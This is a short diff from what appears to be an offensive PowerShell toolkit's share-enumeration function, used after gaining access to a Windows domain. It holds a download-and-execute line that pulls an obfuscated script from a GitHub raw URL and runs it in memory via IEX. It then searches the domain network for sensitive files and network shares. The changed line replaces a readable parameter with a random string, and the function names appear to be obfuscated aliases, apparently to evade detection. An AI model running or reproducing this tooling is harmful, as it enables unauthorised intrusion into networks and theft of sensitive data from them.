@@ -755,7 +755,7 @@ function shareenumeration
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
     Write-Host -ForegroundColor Yellow 'Searching for sensitive Files on the Domain-Network, this can take a while:'
     Claire >> $currentPath\SensitiveFiles.txt
-    shift -ExcludeStandard >> $currentPath\Networkshares.txt
+    shift -qgsNZggitoinaTA >> $currentPath\Networkshares.txt
 }
 
 function groupsearch
